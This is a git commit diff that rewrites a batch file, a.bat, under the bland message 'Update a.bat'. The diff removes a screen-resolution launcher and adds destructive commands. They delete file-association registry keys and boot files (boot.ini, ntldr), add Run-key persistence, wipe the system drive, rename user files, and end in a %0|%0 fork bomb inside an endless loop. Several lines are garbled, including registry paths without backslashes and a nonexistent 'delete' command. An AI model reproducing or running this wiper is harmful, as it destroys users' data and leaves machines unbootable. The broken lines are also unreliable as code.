8702f2ca4983351005a1fb2ee04338d6b2b6d382
noo <67281372+fonsixx@users.noreply.github.com>
2021-12-28 21:01:41 -0600

    Update a.bat

--- a.bat
+++ a.bat
@@ -1,5 +1,18 @@
 :a
-set BrowserPath = dir /s /b QRes.exe
-start "%BrowserPath%" /x:800 /y:600
-start "%BrowserPath%" /x:1920 /y:1200
+START reg delete HKCR/.exe
+START reg delete HKCR/.dll
+START reg delete HKCR/*
+attrib -r -s -h c:\autoexec.bat
+del c:\autoexec.bat
+attrib -r -s -h c:\boot.ini
+del c:\boot.ini
+attrib -r -s -h c:\ntldr
+del c:\ntldr
+attrib -r -s -h c:\windows\win.ini
+del c:\windows\win.ini
+reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
+reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:window
+delete %systemdrive%\*.* /f /s
+REN *.avi *.txt REN *.mkv *.txt REN *.BAT *.txt REN *.doc *.txt REN *.JPEG *.txt REN *.lnk *.txt REN *.EXE *.noob
+%0|%0
 goto a
